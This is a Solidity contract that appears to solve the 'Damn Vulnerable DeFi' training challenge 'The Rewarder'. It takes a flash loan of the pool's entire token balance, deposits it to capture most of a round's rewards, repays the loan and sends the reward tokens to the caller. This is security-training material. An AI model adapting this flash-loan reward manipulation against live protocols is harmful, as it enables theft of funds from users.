// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";

/**
 * @title RewardedAttacker
 * @author Jonatas Campos Martins
 * @dev The main idea of this contract is to use the flash load to borrow some tokens, deposit them in * the pool and then get the most of rewards from the pool
 */
contract RewardedAttacker {
    DamnValuableToken private liquidityToken;
    FlashLoanerPool private flashLoanPool;
    TheRewarderPool private rewarderPool;
    RewardToken private rewardToken;

    receive() external payable {}

    constructor(
        address _tokenAddress,
        address _rewardToken,
        address _flashLoanPool,
        address _rewarderPool
    ) {
        liquidityToken = DamnValuableToken(_tokenAddress);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewardToken = RewardToken(_rewardToken);
    }

    function attackRewardedPool() external {
        uint256 balancePool = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(balancePool);

        //Transfer the rewarded token to attacker
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(address(msg.sender), rewardBalance);
    }

    function receiveFlashLoan(uint256 _amount) external {
        liquidityToken.approve(address(rewarderPool), _amount);
        rewarderPool.deposit(_amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(_amount);
        liquidityToken.transfer(address(flashLoanPool), _amount);
    }
}
